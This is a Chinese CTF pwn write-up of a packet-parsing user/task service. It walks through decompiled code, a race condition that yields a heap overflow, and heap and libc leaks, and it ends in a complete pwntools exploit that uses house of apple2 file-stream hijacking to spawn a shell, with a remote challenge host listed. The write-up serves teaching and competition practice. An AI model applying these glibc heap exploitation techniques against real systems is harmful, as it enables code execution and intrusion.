---
title: 据说是 NeSE 考核题目的题解
date: 2026-04-27 10:50:00
tags: 
    - pwn
    - heap
    - house of apple2
    - IO_FILE
    - race condition
    - 堆溢出
    - 结构体复用
categories: pwn 题解
---

## checksec

```
[*] '/home/RatherHard/CTF-pwn/dlutctf2025/deploy/main'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## IDA

### main

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  const char *password; // rdx
  const char *password_1; // rdx
  __int64 task; // rbx
  int i; // [rsp+4h] [rbp-6Ch]
  int idx; // [rsp+8h] [rbp-68h]
  int idx_1; // [rsp+Ch] [rbp-64h]
  _DWORD *packet; // [rsp+10h] [rbp-60h]
  const char *token; // [rsp+18h] [rbp-58h]
  char *command; // [rsp+20h] [rbp-50h]
  __int64 user; // [rsp+28h] [rbp-48h]
  char *task_content; // [rsp+38h] [rbp-38h]
  const char *name_1; // [rsp+40h] [rbp-30h]
  const char *name; // [rsp+50h] [rbp-20h]

  while ( 1 )
  {
    while ( 1 )
    {
      packet = read_packet();
      token = (const char *)get_filed_value((__int64)packet, "user_token");
      command = (char *)get_filed_value((__int64)packet, "command");
      if ( !command )
        err("Invalid packet");
      if ( !token )
      {
        if ( !strcmp(command, "login") )
        {
          name = (const char *)get_filed_value((__int64)packet, "username");
          password = (const char *)get_filed_value((__int64)packet, "password");
          user_login(name, password);
        }
        else
        {
          if ( strcmp(command, "register") )
            err("Invalid command");
          name_1 = (const char *)get_filed_value((__int64)packet, "username");
          password_1 = (const char *)get_filed_value((__int64)packet, "password");
          user_register(name_1, password_1);
        }
        goto LABEL_28;
      }
      idx = search_user_by_token(token, 32);
      if ( idx == -1 )
        err("Invalid token");
      user = all_users[idx];
      if ( strcmp(command, "submit_task") )
        break;
      if ( *(_QWORD *)(user + 0x20) )           // task
      {
        if ( !*(_DWORD *)(user + 0x18) )
        {
          *(_DWORD *)(user + 0x18) = 1;
          task_content = (char *)get_filed_value((__int64)packet, "task_content");
          if ( !task_content )
            err("Invalid packet");
          task = *(_QWORD *)(user + 32);
          *(_QWORD *)(task + 32) = strdup(task_content);
          run_task(*(void **)(user + 32));
          goto LABEL_28;
        }
        puts("Task is being running, try again later");
      }
      else
      {
        puts("Sorry you cannot run task");
      }
    }
    if ( strcmp(command, "deregister") )
      err("Invalid command");
    if ( user_count > 0 )
    {
      idx_1 = search_user_by_token(token, 32);
      if ( idx_1 == -1 )
        err("Invalid token");
      free((void *)all_users[idx_1]);
      for ( i = idx_1; i < user_count - 1; ++i )
        all_users[i] = all_users[i + 1];
      all_users[--user_count] = 0;
      puts("Deregister success");
LABEL_28:
      free_packet((__int64)packet);
    }
  }
}
```

### read_packet

```c
_DWORD *read_packet()
{
  int len; // [rsp+4h] [rbp-102Ch]
  char *s; // [rsp+8h] [rbp-1028h]
  _DWORD *packet; // [rsp+10h] [rbp-1020h]
  char *v4; // [rsp+18h] [rbp-1018h]
  _QWORD buf[514]; // [rsp+20h] [rbp-1010h] BYREF

  buf[513] = __readfsqword(0x28u);
  memset(buf, 0, 0x1000u);
  len = read(0, buf, 0xFFFu);
  *((_BYTE *)buf + len) = 0;
  packet = create_packet();
  for ( s = (char *)buf; s < (char *)buf + len; s = v4 + 1 )
  {
    v4 = strchr(s, '\n');
    if ( !v4 )
      break;
    *v4 = 0;
    packet_parse_line((__int64)packet, s);
  }
  return packet;
}
```

解析数据包，按行分配

### create_packet

```c
_DWORD *create_packet()
{
  _DWORD *ptr; // [rsp+8h] [rbp-8h]

  ptr = malloc(0x10u);
  if ( ptr )
  {
    *(_QWORD *)ptr = malloc(0x80u);
    if ( *(_QWORD *)ptr )
    {
      ptr[2] = 0;
      ptr[3] = 8;
      return ptr;
    }
    else
    {
      perror("malloc fields failed");
      free(ptr);
      return 0;
    }
  }
  else
  {
    perror("malloc packet failed");
    return 0;
  }
}
```

为数据包分配空间

### packet_parse_line

```c
void __fastcall packet_parse_line(__int64 packet, const char *key)
{
  char *value; // [rsp+18h] [rbp-18h]

  value = strchr(key, ':');
  if ( value )
  {
    *value = 0;
    add_filed(packet, key, value + 1);
  }
}
```

可以看出数据包的格式：

```
key1:val1\nkey2:val2\n...
```

### add_filed

```c
void __fastcall add_filed(__int64 packet, const char *key, const char *value)
{
  char **v3; // rbx
  __int64 v4; // rbx

  if ( packet
    && key
    && value
    && (*(_DWORD *)(packet + 8) < *(_DWORD *)(packet + 12) || (unsigned int)expand_fields(packet)) )
  {
    v3 = (char **)(*(_QWORD *)packet + 16LL * *(int *)(packet + 8));
    *v3 = strdup(key);
    v4 = *(_QWORD *)packet + 16LL * *(int *)(packet + 8);
    *(_QWORD *)(v4 + 8) = strdup(value);
    ++*(_DWORD *)(packet + 8);
  }
}
```

注意 strdup 会为字符串分配堆空间

### get_filed_value

```c
__int64 __fastcall get_filed_value(__int64 packet, const char *key)
{
  int i; // [rsp+1Ch] [rbp-4h]

  if ( !packet || !key )
    return 0;
  for ( i = 0; i < *(_DWORD *)(packet + 8); ++i )
  {
    if ( !strcmp(*(const char **)(16LL * i + *(_QWORD *)packet), key) )
      return *(_QWORD *)(16LL * i + *(_QWORD *)packet + 8);
  }
  return 0;
}
```

### user_login

```c
__int64 __fastcall user_login(const char *name, const char *password)
{
  __int64 result; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  if ( !name || !password )
    return 0;
  for ( i = 0; ; ++i )
  {
    result = (unsigned int)user_count;
    if ( i >= user_count )
      break;
    if ( !strcmp(name, *(const char **)(all_users[i] + 8LL)) && !strcmp(password, *(const char **)(all_users[i] + 16LL)) )
    {
      puts("Login success");
      printf("user_token:%s\n", *(const char **)all_users[i]);
    }
  }
  return result;
}
```

登录逻辑，登录成功会返回 token

### user_register

```c
__int64 __fastcall user_register(const char *name, const char *password)
{
  int idx; // eax
  int i; // [rsp+14h] [rbp-Ch]
  _QWORD *user; // [rsp+18h] [rbp-8h]

  if ( !name || !password )
    return 0xFFFFFFFFLL;
  for ( i = 0; i < user_count; ++i )
  {
    if ( !strcmp(name, *(const char **)(all_users[i] + 8LL)) )
      err("User already exists");
  }
  user = malloc(0x28u);
  *user = malloc(0x20u);                        // token
  gen_random_bytes((_BYTE *)*user, 0x20u);
  user[1] = strdup(name);
  user[2] = strdup(password);
  *((_DWORD *)user + 6) = 0;
  allocate_task((__int64)user);
  idx = user_count++;
  all_users[idx] = user;
  puts("Reigster success!");
  return 0;
}
```

会尝试为每个用户分配 task 空间

### allocate_task

```c
__int64 __fastcall allocate_task(__int64 user)
{
  __int64 result; // rax
  _QWORD *task; // [rsp+18h] [rbp-8h]

  result = (unsigned int)task_allocated;
  if ( task_allocated <= 15 )
  {
    task = malloc(0x28u);
    task[1] = 0;
    *(_DWORD *)task = 0;
    task[3] = user + 0x18;
    ++task_allocated;
    result = user;
    *(_QWORD *)(user + 0x20) = task;
  }
  return result;
}
```

task 上限为 15 个

### search_user_by_token

```c
__int64 __fastcall search_user_by_token(const char *token, int len)
{
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i < user_count; ++i )
  {
    if ( !strncmp(token, *(const char **)all_users[i], len) )
      return (unsigned int)i;
  }
  return 0xFFFFFFFFLL;
}
```

### run_task

```c
unsigned __int64 __fastcall run_task(void *task)
{
  pthread_t newthread; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  pthread_create(&newthread, 0, (void *(*)(void *))do_task, task);
  return v3 - __readfsqword(0x28u);
}
```

开一个线程跑任务，直接跑，没有锁的相关逻辑

### free_packet

```c
void __fastcall free_packet(__int64 packet)
{
  int i; // [rsp+1Ch] [rbp-4h]

  if ( packet )
  {
    for ( i = 0; i < *(_DWORD *)(packet + 8); ++i )
    {
      free(*(void **)(16LL * i + *(_QWORD *)packet));
      free(*(void **)(16LL * i + *(_QWORD *)packet + 8));
    }
    free(*(void **)packet);
    free((void *)packet);
  }
}
```

释放与 packet 有关的所有资源

### do_task

```c
void *__fastcall do_task(const char **task)
{
  int i; // [rsp+1Ch] [rbp-14h]
  char *dest; // [rsp+28h] [rbp-8h]

  *(_DWORD *)task = strlen(task[4]);
  dest = (char *)task[4];
  for ( i = 0; i < *(_DWORD *)task; ++i )
    task[4][i] ^= 0x3Fu;
  task_log(*((_DWORD *)task + 4), "Task has been done\n");
  memcpy(dest, task[4], *(int *)task);
  return 0;
}
```

执行任务，会先对 task content 做一个异或操作，然后重新自拷贝一遍

如果在 memcpy 之前覆写了 task content 的指针，就有机会重写 dest 的内容并实现堆溢出

利用异或操作可以规避 '\x00' 的截断

### task_log

```c
unsigned __int64 __fastcall task_log(int a1, const char *a2)
{
  int v3; // [rsp+14h] [rbp-2BCh]
  int v4; // [rsp+1Ch] [rbp-2B4h]
  time_t timer; // [rsp+20h] [rbp-2B0h] BYREF
  struct tm *tp; // [rsp+28h] [rbp-2A8h]
  FILE *stream; // [rsp+30h] [rbp-2A0h]
  size_t v8; // [rsp+38h] [rbp-298h]
  char filename[64]; // [rsp+40h] [rbp-290h] BYREF
  char s[64]; // [rsp+80h] [rbp-250h] BYREF
  char ptr[520]; // [rsp+C0h] [rbp-210h] BYREF
  unsigned __int64 v12; // [rsp+2C8h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  time(&timer);
  tp = localtime(&timer);
  strftime(s, 0x40u, "%Y-%m-%d %H:%M:%S", tp);
  v3 = strlen(s);
  v4 = v3 + strlen(a2) + 3;
  memset(ptr, 0, 0x200u);
  snprintf(filename, 0x40u, "/tmp/task_%d_log", a1);
  stream = fopen(filename, "a");
  if ( stream )
  {
    snprintf(ptr, v4 + 1, "%s: %s\n", s, a2);
    v8 = fwrite(ptr, 1u, v4, stream);
    fclose(stream);
  }
  sleep(4u);
  return v12 - __readfsqword(0x28u);
}
```

阻塞 4 秒，为上面的条件竞争创造了有利的条件

## 结构体分析

![这是什么鸭](https://pic.ratherhard.com/post/NeSE-test-pwn-deploy/structure.svg)

strdup 的存在大大增加了堆环境的复杂性

packet 有关的所有堆内存都会在数据处理完成后释放，每一轮循环开始时申请，结束时释放

其余的堆内存只有 user-info 会在 deregister 时被释放

## 漏洞分析

最重要的漏洞便是上面提到的条件竞争产生的堆溢出，利用过程为：

1. 首先 register 15 个用户，让 allocated_task 达到上限
2. 对用户 A 进行 submit_task 
3. 在 do_task 处于 memcpy 的阻塞状态时，把 A deregister 掉，然后再 register 用户 B ，使用户 B 的 user-info chunk 刚好是被 free 掉的用户 A 的 user-info chunk ，此时由于 allocated_task 已经达到上限且不会回退，B 的 task 还是原来 A 的 task ，同时 B 的 running-tag 被重置为 0 ，所以允许 B 再次 submit_task 去提交更大的 content
4. 让 B 提交更大的 content 等 A 的 task 阻塞结束后，触发 memcpy ，使得旧的 content(strdup) 的内容被新的 content(strdup) 覆写，并产生溢出，溢出位置在旧的 content(strdup) 上，并且有充足的溢出长度

在溢出过程中，我们需要去伪造一些指针，这就需要泄露堆地址，这一点是比较容易的：注意到 token 的 chunk 大小和 user-info 一致，我们只要在一轮注册中安排 token 被分配到被释放的 user-info chunk 上，就可以通过 task 泄露堆地址

密切关注可能的 0x30 大小的 chunk ，我们发现在一次 register->login->deregister->register->login 路径中，由于提交的数据包包含 token ，一共会申请两个大小为 0x30 的 chunk 并释放， user-info 先释放， packet 中的 token 的 value 后释放，那么在第二个 register 中，由于 user-info 先申请， token 后申请，根据 tcache 的 LIFO 特性，旧的 user-info 会被分配给 token ，最后的 login 的 printf 就会把堆地址泄露出来

然后是 libc 的泄露，需要用到上面的堆溢出

经过精心（xia meng）布局堆的结构，我们使得溢出的时候能够轻易够到某个 user-info chunk 然后劫持它的 token 指针，指向一个写了 libc 相关地址的位置，然后用 login 读出即可

最后我们还可以注意到在 submit_task 时会往 task + 0x20 上写一个可控的堆地址  (content) ，这意味着我们可以劫持 task 去实现任意地址写可控堆地址，然后就有机会打 house of apple2 啦

总结一下路径

```
leak heap -> overflow to leak libc -> hijack task ptr to write house of apple2
```

## exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

file = './main_patched'
elf = ELF(file)
libc = ELF('./libc.so.6')

target = '60.205.163.215'
port = 13774

if debug:
    p = process(file)
else:
    p = remote(target, port)

io = p

def dbg(cmd = ''):
    if debug:
        gdb.attach(p, gdbscript = cmd)

s       = lambda data           :p.send(data)
sl      = lambda data           :p.sendline(data)
sa      = lambda x, data        :p.sendafter(x, data)
sla     = lambda x, data        :p.sendlineafter(x, data)
r       = lambda num=4096       :p.recv(num)
rl      = lambda num=4096       :p.recvline(num)
ru      = lambda x              :p.recvuntil(x)
itr     = lambda                :p.interactive()
uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
uru64   = lambda                :uu64(ru('\x7f')[-6:])
leak    = lambda name           :log.success(name + ' = ' + hex(eval(name)))

def safe_linking(pos, ptr):
    return (pos >> 12) ^ ptr

def transpld(payload):
    return bytes([b ^ 0x3f for b in payload])

def sendpacket(packet):
    data = b''
    for key, val in packet.items():
        data += key + b':' + val + b'\n'
    s(data)
    
def register(name, pwd):
    sendpacket({
        b'command': b'register',
        b'username': name.encode(),
        b'password': pwd.encode()
    })

def login(name, pwd):
    sendpacket({
        b'command': b'login',
        b'username': name.encode(),
        b'password': pwd.encode()
    })

def submit_task(token, content):
    sendpacket({
        b'command': b'submit_task',
        b'user_token': token,
        b'task_content': transpld(content)
    })

def deregister(token):
    sendpacket({
        b'command': b'deregister',
        b'user_token': token
    })

register('QwQ', 'QwQ')  # leak heap
login('QwQ', 'QwQ')
ru(b'token:')
qwqtoken = r(32)
deregister(qwqtoken)
register('QwQ', 'QwQ')
login('QwQ', 'QwQ')
ru(b'token:')
qwqtoken = r(32)
heap = uu64(r(6)) - 0x4b0
leak('heap')

for i in range(13): # heap feng shui
    register(str(i), str(i))
sendpacket({
    b'command': b'login',
    b'a': b'a' * 0x30,
    b'b': b'a' * 0x30,
    b'c': b'a' * 0x30,
    b'd': b'a' * 0x30
})
register('OwO', 'OwO')
login('OwO', 'OwO')
ru(b'token:')
owotoken = r(32)

fake_heap = flat({  # race condition and heap overflow
    0x8: 0x41,
    0x10: safe_linking(heap + 0x1000, heap + 0x1460),
    0x48: 0x31,
    0x50: heap + 0x1640,
    0x58: heap + 0x3f0,
    0x60: heap + 0x1770,
}, filler = b'\x00')
payload = b'B' * 0x30 + fake_heap + b'\x00'
submit_task(owotoken, b'A' * 0x30)
deregister(owotoken)
register('www', 'w' * 0x20)
login('www', 'w' * 0x20)
ru(b'token:')
token = r(32)
submit_task(token, payload)
sleep(4)

login('www', 'w' * 0x20)    # leak libc
ru(b'token:')
token = r(6)
libc.address = uu64(token) + 0x9c8
leak('libc.address')
target = libc.sym['stdout'] - 0x20

fake_heap = flat({  # race condition and heap overflow
    0x8: 0x41,
    0x48: 0x41,
    0x50: safe_linking(heap + 0x1000, heap + 0x1420),
    0x88: 0x31,
    0x90: heap + 0x15f0,
    0x98: heap + 0x1b60,
    0xa0: heap + 0x1b80,
    0xb0: target,
}, filler = b'\x00')
payload = b'B' * 0x30 + fake_heap + b'\x31'
submit_task(token, b'A' * 0x30)
deregister(token)
register('mmm', 'mmm')
login('mmm', 'mmm')
ru(b'token:')
token = r(32)
submit_task(token, payload)
sleep(4)

fake_io_base = heap + 0x1fe0    # house of apple2
fake_io = flat({
    0x0: b'  sh;',
    0x8: 0,
    0x20: 0,
    0x68: libc.sym['system'],
    0x88: fake_io_base,
    0xA0: fake_io_base - 0x10, # __rdx__
    0xD0: fake_io_base,
    0xD8: libc.sym['_IO_wfile_jumps'] - 0x20,
}, filler=b"\x00")
submit_task(token, fake_io)
sleep(5)

sendpacket({    # tricker
    b'a': b'a',
})

itr()
```